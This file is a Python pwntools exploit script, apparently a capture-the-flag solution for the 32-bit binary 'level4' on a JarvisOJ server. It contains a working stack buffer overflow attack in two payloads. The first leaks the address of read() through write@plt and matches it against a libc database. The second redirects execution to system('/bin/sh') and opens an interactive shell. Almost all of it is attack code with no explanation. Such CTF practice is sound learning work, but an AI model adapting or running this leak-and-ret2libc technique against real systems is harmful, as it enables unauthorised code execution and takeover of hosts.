#!/usr/bin/python3
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = "info"

class Libc:
    def __init__(self, conditions, max_candidates_wanted=0x01):
        self.libc_database_path = "/opt/libc-database/db/"
        self.libc_paths = __import__("glob").glob("{}/*.so".format(self.libc_database_path))[::-1]
        self.libc_candidates = []
        for i in range(len(self.libc_paths)):
            path = self.libc_paths[i]
            log.info("[{} found] in [{} / {}] {}\r".format(len(self.libc_candidates), i, len(self.libc_paths), path))
            libc = ELF(path)
            flag = True
            for function, address in conditions.items():
                if libc.symbols[function] & 0xfff != address & 0xfff:
                    flag = False
            if flag == True:
                libc.address = address - libc.symbols[function]
                self.libc_candidates.append(libc)
                log.info("Found: {}".format(self.libc_candidates))
            if len(self.libc_candidates) >= max_candidates_wanted:
                log.info("Candidates: {}".format(self.libc_candidates))
                break

if len(sys.argv) > 1:
    io = remote("pwn2.jarvisoj.com", 9880)
else:
    io = process("./level4")

elf = ELF("./level4")

write_plt = elf.plt["write"]
read_got = elf.got["read"]
main_addr = elf.symbols["main"]

stdout = 1
stdin = 0

size = 4

# write(stdout, read_got, 4)
payload = flat([
    "A" * 0x88 + "BBBB", 
    write_plt,
    main_addr,
    stdout,
    read_got,
    size,
])
io.sendline(payload)
read_addr = u32(io.read(4))
log.info("read_addr: {:x}".format(read_addr))

# find libc 
libc = Libc({"read": read_addr}).libc_candidates[0]

log.info("libc_addr: {:x}".format(libc.address))

# system("/bin/sh")
system_addr = libc.symbols["system"]
bin_sh_addr = next(libc.search(b"/bin/sh\x00"))

log.info("system_addr: {:x}".format(system_addr))
log.info("bin_sh_addr: {:x}".format(bin_sh_addr))

payload = flat([
    "A" * 0x88 + "BBBB", 
    system_addr,
    main_addr,
    bin_sh_addr,
])
io.sendline(payload)

io.interactive()
